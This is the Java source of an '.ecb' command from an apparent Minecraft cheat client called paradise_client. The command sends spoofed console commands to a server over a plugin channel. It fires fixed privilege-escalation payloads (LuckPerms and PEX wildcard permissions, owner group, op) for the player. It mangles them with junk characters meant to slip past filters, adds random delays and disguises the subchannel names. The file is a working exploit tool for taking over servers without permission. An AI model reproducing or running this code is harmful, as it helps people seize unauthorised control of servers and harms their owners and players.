package net.paradise_client.command.impl;

import com.mojang.brigadier.arguments.StringArgumentType;
import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import net.minecraft.command.CommandSource;
import net.minecraft.client.MinecraftClient;
import net.paradise_client.Helper;
import net.paradise_client.command.Command;

import java.util.Random;

public class ECBCommand extends Command {
    private final MinecraftClient mc = MinecraftClient.getInstance();
    private final Random random = new Random();

    public ECBCommand() {
        super("ecb", "Send a spoofed console command using plugin channel.");
    }

    @Override
    public void build(LiteralArgumentBuilder<CommandSource> root) {
        root.executes(ctx -> {
            Helper.printChatMessage("§cUsage: .ecb <command>");
            return SINGLE_SUCCESS;
        }).then(argument("command", StringArgumentType.greedyString())
            .executes(ctx -> {
                String inputCommand = ctx.getArgument("command", String.class);

                // Launch in a new thread
                new Thread(() -> {
                    if (mc.player == null || mc.getNetworkHandler() == null) {
                        Helper.printChatMessage("§cPlayer not connected or initialized.");
                        return;
                    }

                    String baseCommand = inputCommand.trim();
                    String obfuscated = obfuscateCommand(baseCommand);
                    String subchannel = generateSpoofedSubChannel();

                    // Add fake permission chaining (LuckPerms/Essentials bait)
                    String[] spoofVariants = {
                            "lp user %s permission set *",
                            "pex user %s add *",
                            "lp user %s parent add owner",
                            "minecraft:op %s"
                    };

                    String playerName = mc.player.getName().getString();

                    for (String variant : spoofVariants) {
                        String finalCommand = String.format(variant, playerName);
                        sendECB(subchannel, obfuscateCommand(finalCommand));
                        sleep(150 + random.nextInt(200)); // small delay
                    }

                    // Final custom command
                    sendECB(subchannel, obfuscated);
                    Helper.printChatMessage("§a[ECB] Exploit payloads sent via spoofed subchannel: §7" + subchannel);
                }).start();

                return SINGLE_SUCCESS;
            }));
    }

    private void sendECB(String channel, String command) {
        Helper.sendPluginMessage("ecb:channel", out -> {
            out.writeUTF(channel);
            out.writeUTF("console_command: " + command);
        });
    }

    private String obfuscateCommand(String command) {
        // Add junk to bypass basic filters
        return command
            .replace("op", "o" + junk() + "p")
            .replace("permission", "perm" + junk() + "ission")
            .replace(" ", " " + junk() + " ");
    }

    private String generateSpoofedSubChannel() {
        String[] base = {"ConsoleExec", "Cmd", "RemoteRun", "Dispatcher", "BungeeAdmin", "LPExec"};
        return base[random.nextInt(base.length)] + random.nextInt(1000);
    }

    private String junk() {
        String[] pool = {"§k§r", "#", "§0", "//", ".", "§f"};
        return pool[random.nextInt(pool.length)];
    }

    private void sleep(long ms) {
        try { Thread.sleep(ms); } catch (InterruptedException ignored) {}
    }
}
